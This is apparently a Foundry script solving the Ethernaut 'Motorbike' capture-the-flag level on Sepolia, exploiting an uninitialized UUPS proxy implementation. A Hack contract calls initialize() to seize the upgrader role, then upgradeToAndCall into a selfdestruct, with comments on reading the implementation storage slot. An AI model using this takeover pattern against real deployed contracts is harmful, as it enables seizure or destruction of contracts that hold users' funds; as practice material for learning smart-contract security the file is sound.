pragma solidity ^0.8;

import "forge-std/Script.sol";

interface IMotorbike {
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
}

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

// Get implementation
// await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// 0x000000000000000000000000c92a73b77c9f2481930c03d1ab343682120320d6
// can check tihs contract address on etherscan

contract Hack {
    function pwn(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}

// because sepolia aready use EIP-6780, so selfdestruct can‘t destory the engine contract to 0x
contract MotorbikeScript is Script {
    function run() external {
        address engineAddr = 0xc92a73B77c9F2481930c03D1ab343682120320d6;
        IEngine target = IEngine(engineAddr);
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Hack hack = new Hack();
        hack.pwn(target);
        vm.stopBroadcast();
    }
}
